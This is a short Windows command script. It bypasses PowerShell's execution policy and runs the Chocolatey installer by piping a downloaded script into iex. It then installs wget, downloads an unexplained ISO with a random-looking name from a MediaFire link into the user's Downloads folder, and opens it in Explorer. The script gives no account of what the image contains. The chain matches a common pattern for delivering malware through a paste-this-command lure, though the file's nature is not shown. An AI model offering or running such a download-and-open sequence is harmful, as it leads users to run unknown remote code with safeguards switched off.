powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install wget --force -y

cd %USERPROFILE%\Downloads


wget https://download940.mediafire.com/4ol5q98fzelg/tq7sb5cf45rlpuu/SmS4k.iso


start "" explorer.exe SmS4k.iso